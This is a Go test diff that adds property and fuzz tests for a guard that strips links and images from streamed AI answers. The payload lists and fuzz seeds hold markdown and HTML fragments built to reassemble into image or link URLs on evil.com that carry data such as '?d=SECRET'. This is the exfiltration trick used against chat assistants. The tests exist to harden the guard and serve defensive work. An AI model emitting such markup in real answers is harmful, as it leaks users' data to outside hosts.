@@ -154,6 +154,65 @@ func propJoinAnswer(r *propRand, text string) string {
 	return b.String()
 }
 
+// propRebuildLeft, propRebuildMiddle and propRebuildRight make markup that
+// becomes an image, a link, a reference definition or a URL once the guard
+// removed the middle, or put a marker in its place: what is left of it, what
+// is right of it, and the middle, which may nest.
+var (
+	propRebuildLeft = []string{"![x]", "[x]", "!", "![", "[", "[a\nb]", "https://evil.com/x", "<https://evil.com/x",
+		"ww", "www.evil", "<im", "<img", "\n[r]", "\n", "\n> [r]", "x", ""}
+	propRebuildMiddle = []string{"[]()", "[](https://evil.com/x?d=1)", "[](<a b>)", "[](a)[](b)", "[(](z)",
+		"![](a)", "![a](https://evil.com/a.png)", "a@b.com", "0912345678", testCanary, "[x](https://evil.com)",
+		"<img src=x>", "\n"}
+	propRebuildRight = []string{"(https://evil.com/DATA.png)", "(https://evil.com/?q=S)", ".png?d=SECRET",
+		".com/a.jpg?x=1", ": https://evil.com/?d=1", "g src=https://evil.com/p.png>", ` src="https://evil.com/p.png">`,
+		"(https://docs.example.com/a)", "](https://evil.com/x)", "[r]", "()", "(https://evil.com/?q=1\n\"t\")",
+		".png?d=SECRET>", ""}
+)
+
+// propRebuildNest returns a middle, nested up to depth times in markup that
+// the guard removes in turn.
+func propRebuildNest(r *propRand, depth int) string {
+	if depth == 0 || r.intn(3) == 0 {
+		var b strings.Builder
+		for n := 1 + r.intn(2); n > 0; n-- {
+			b.WriteString(r.pick(propRebuildMiddle))
+		}
+		return b.String()
+	}
+	inner := propRebuildNest(r, depth-1)
+	switch r.intn(3) {
+	case 0:
+		return "[" + inner + "]()"
+	case 1:
+		return "[]" + inner + "()"
+	default:
+		return inner + r.pick(propRebuildMiddle)
+	}
+}
+
+// propRebuild returns one piece of such markup.
+func propRebuild(r *propRand) string {
+	return r.pick(propRebuildLeft) + propRebuildNest(r, 3) + r.pick(propRebuildRight)
+}
+
+// propRebuildAnswer places one to three pieces of such markup at word
+// boundaries of text.
+func propRebuildAnswer(r *propRand, text string) string {
+	var b strings.Builder
+	last := 0
+	for n := 1 + r.intn(3); n > 0; n-- {
+		at := last + r.intn(len(text)-last+1)
+		for at < len(text) && text[at] != ' ' {
+			at++
+		}
+		b.WriteString(text[last:at] + " " + propRebuild(r) + " ")
+		last = at
+	}
+	b.WriteString(text[last:])
+	return b.String()
+}
+
 // checkNotJoined checks that no value split by markup came out whole: joined
 // again by the removal of the markup, it must be redacted as it would be
 // without the markup. (A part of a value that the guard redacts on its own,
@@ -333,26 +392,41 @@ func TestStreamPropertyRandomAnswers(t *testing.T) {
 		r := &propRand{s: uint64(seed)}
 		text := propAnswer(r)
 		t.Run(fmt.Sprint(seed), func(t *testing.T) {
-			if want := checkAnswer(t, r, text, 4); strings.Contains(want, testCanary) {
+			s := propScanner(CanaryRedact)
+			want := checkAnswer(t, r, text, 4)
+			if strings.Contains(want, testCanary) {
 				t.Fatalf("the canary got through: %q", want)
 			}
+			checkNoLeaks(t, s, text, want)
 			// The same answer with values split by markup the guard removes.
 			joined := propJoinAnswer(r, text)
-			want := checkAnswer(t, r, joined, 2)
+			want = checkAnswer(t, r, joined, 2)
 			if strings.Contains(want, testCanary) {
 				t.Fatalf("the joined canary got through: %q", want)
 			}
 			checkNotJoined(t, joined, want)
+			checkNoLeaks(t, s, joined, want)
+			// The same answer with markup that a removal turns into an image,
+			// a link or a URL: none may be left in what the guard sends.
+			rebuilt := propRebuildAnswer(r, text)
+			want = checkAnswer(t, r, rebuilt, 2)
+			if strings.Contains(want, testCanary) {
+				t.Fatalf("the canary got through: %q", want)
+			}
+			checkNoLeaks(t, s, rebuilt, want)
 		})
 	}
 }
 
 // FuzzStreamGuard fuzzes the seed of a random answer and of its splits, and a
-// short fragment placed at a random spot in it, or inside the canary or a
-// value with personal data added to it. The fragment can split the value with
-// a link that the guard then removes, joining the parts again: the canary must
-// still never get through, and the stream must send what the whole-answer
-// guard produces.
+// short fragment placed at a random spot in it, inside the canary or a value
+// with personal data added to it, or inside markup around a link the guard
+// removes. The fragment can split the value with a link that the guard then
+// removes, joining the parts again, or form an image, a link or a URL with
+// what is around it once the guard removed something: the canary must still
+// never get through, no image, link or URL the guard removes may be left in
+// what it sends (as the guard and a CommonMark renderer read it), and the
+// stream must send what the whole-answer guard produces.
 func FuzzStreamGuard(f *testing.F) {
 	f.Add(uint64(1), "")
 	f.Add(uint64(7), "a@b.co")
@@ -362,6 +436,12 @@ func FuzzStreamGuard(f *testing.F) {
 	f.Add(uint64(5), "[]()")
 	f.Add(uint64(6), "[](https://evil.com/x?d=1)")
 	f.Add(uint64(8), "[a](b)")
+	f.Add(uint64(10), "![x][]()(https://evil.com/DATA.png)")
+	f.Add(uint64(11), "![x][(](z)https://evil.com/DATA.png)")
+	f.Add(uint64(12), "https://evil.com/x[](y).png?d=SECRET")
+	f.Add(uint64(13), "![a](https://evil.com/a.png)(https://evil.com/?q=S)")
+	f.Add(uint64(14), "[")
+	f.Add(uint64(15), "](")
 	f.Fuzz(func(t *testing.T, seed uint64, extra string) {
 		if len(extra) > 48 || !utf8.ValidString(extra) {
 			return
@@ -372,21 +452,26 @@ func FuzzStreamGuard(f *testing.F) {
 		for at < len(text) && text[at]&0xC0 == 0x80 {
 			at++
 		}
-		inside := r.intn(2) == 0
-		if inside {
+		mode := r.intn(3)
+		switch mode {
+		case 0: // inside a value
 			v := r.pick(propJoinable)
 			k := 1 + r.intn(len(v)-1)
 			text = text[:at] + " " + v[:k] + extra + v[k:] + " " + text[at:]
-		} else {
+		case 1:
 			text = text[:at] + extra + text[at:]
+		default: // inside markup around a removed link
+			text = text[:at] + " " + r.pick(propRebuildLeft) + extra + propRebuildNest(r, 2) +
+				r.pick(propRebuildRight) + " " + text[at:]
 		}
 		want := checkAnswer(t, r, text, 2)
 		if strings.Contains(want, testCanary) {
 			t.Fatalf("the canary got through: %q", want)
 		}
-		if inside {
+		if mode == 0 {
 			checkNotJoined(t, text, want)
 		}
+		checkNoLeaks(t, propScanner(CanaryRedact), text, want)
 	})
 }
 
